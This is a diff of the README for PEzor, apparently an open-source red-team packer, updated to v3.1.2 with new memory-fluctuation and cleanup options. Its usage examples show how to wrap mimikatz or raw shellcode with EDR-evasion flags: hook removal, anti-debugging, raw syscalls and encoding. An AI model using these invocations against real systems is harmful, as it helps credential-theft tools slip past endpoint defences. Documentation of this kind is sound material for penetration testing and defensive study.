@@ -10,7 +10,7 @@ Read the blog posts here:
 
 ```raw
  ________________
-< PEzor!! v3.0.3 >
+< PEzor!! v3.1.2 >
  ----------------
       \                    / \  //\
        \    |\___/|      /   \//  \\
@@ -76,11 +76,6 @@ USAGE
 Pack the provided executable into a new one
 
 ```
-USAGE
-  $ PEzor [options...] <EXECUTABLE> [donut args...]
-
-# PEzor [options...] <EXECUTABLE> [donut args...]
-
 OPTIONS
   -h                        Show usage and exits
   -32                       Force 32-bit executable
@@ -94,17 +89,23 @@ OPTIONS
   -rx                       Allocate RX memory for shellcode
   -self                     Execute the shellcode in the same thread
   -sdk=VERSION              Use specified .NET Framework version (2, 4, 4.5 (default))
+  -cleanup                  Perform the cleanup of allocated payload and loaded modules (only for BOFs)
   -sleep=N                  Sleeps for N seconds before unpacking the shellcode
   -format=FORMAT            Outputs result in specified FORMAT (exe, dll, reflective-dll, service-exe, service-dll, dotnet, dotnet-createsection, dotnet-pinvoke)
+  -fluctuate=PROTECTION     Fluctuate memory region to PROTECTION (RW or NA) by hooking Sleep()
   [donut args...]           After the executable to pack, you can pass additional Donut args, such as -z 2
 
 EXAMPLES
   # 64-bit (self-inject RWX)
-  $ PEzor.sh -unhook -antidebug -text -self -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
+  $ PEzor.sh -unhook -antidebug -text -self -sleep=120 mimikatz/x64/mimikatz.exe -z 2
   # 64-bit (self-inject RX)
-  $ PEzor.sh -unhook -antidebug -text -self -rx -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
+  $ PEzor.sh -unhook -antidebug -text -self -rx -sleep=120 mimikatz/x64/mimikatz.exe -z 2
   # 64-bit (raw syscalls)
-  $ PEzor.sh -sgn -unhook -antidebug -text -syscalls -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
+  $ PEzor.sh -sgn -unhook -antidebug -text -syscalls -sleep=120 mimikatz/x64/mimikatz.exe -z 2
+  # 64-bit (fluctuate to READWRITE when sleeping)
+  $ PEzor.sh -fluctuate=RW -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '"coffee" "sleep 5000" "coffee" "exit"'
+  # 64-bit (fluctuate to NOACCESS when sleeping)
+  $ PEzor.sh -fluctuate=NA -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '"coffee" "sleep 5000" "coffee" "exit"'
   # 64-bit (beacon object file)
   $ PEzor.sh -format=bof mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
   # 64-bit (beacon object file w/ cleanup)
@@ -146,13 +147,16 @@ OPTIONS
   -debug                    Generate a debug build
   -unhook                   User-land hooks removal
   -antidebug                Add anti-debug checks
+  -shellcode                Force shellcode detection
   -syscalls                 Use raw syscalls [64-bit only] [Windows 10 only]
   -sgn                      Encode the provided shellcode with sgn
   -text                     Store shellcode in .text section instead of .data
   -rx                       Allocate RX memory for shellcode
   -self                     Execute the shellcode in the same thread [requires RX shellcode, not compatible with -sgn]
+  -cleanup                  Perform the cleanup of allocated payload and loaded modules (only for BOFs)
   -sleep=N                  Sleeps for N seconds before unpacking the shellcode
   -format=FORMAT            Outputs result in specified FORMAT (exe, dll, reflective-dll, service-exe, service-dll, dotnet, dotnet-createsection, dotnet-pinvoke)
+  -fluctuate=PROTECTION     Fluctuate memory region to PROTECTION (RW or NA) by hooking Sleep()
 
 EXAMPLES
   # 64-bit (self-inject RWX)
@@ -163,6 +167,10 @@ EXAMPLES
   $ PEzor.sh -unhook -antidebug -text -self -sleep=120 shellcode.bin
   # 64-bit (raw syscalls)
   $ PEzor.sh -sgn -unhook -antidebug -text -syscalls -sleep=120 shellcode.bin
+  # 64-bit (fluctuate to READWRITE when sleeping)
+  $ PEzor.sh -fluctuate=RW shellcode.bin
+  # 64-bit (fluctuate to NOACCESS when sleeping)
+  $ PEzor.sh -fluctuate=NA shellcode.bin
   # 64-bit (beacon object file)
   $ PEzor.sh -format=bof shellcode.bin
   # 64-bit (beacon object file w/ cleanup)
@@ -182,7 +190,7 @@ EXAMPLES
   # 32-bit (self-inject)
   $ PEzor.sh -unhook -antidebug -text -self -sleep=120 shellcode.bin
   # 32-bit (Win32 API: VirtualAlloc/WriteMemoryProcess/CreateRemoteThread)
-  $ PEzor.sh -sgn -unhook -antidebug -text -sleep=120 shellcode.bin'
+  $ PEzor.sh -sgn -unhook -antidebug -text -sleep=120 shellcode.bin
 ```
 
 _See code: [PEzor.sh](https://github.com/phra/PEzor/blob/master/PEzor.sh)_
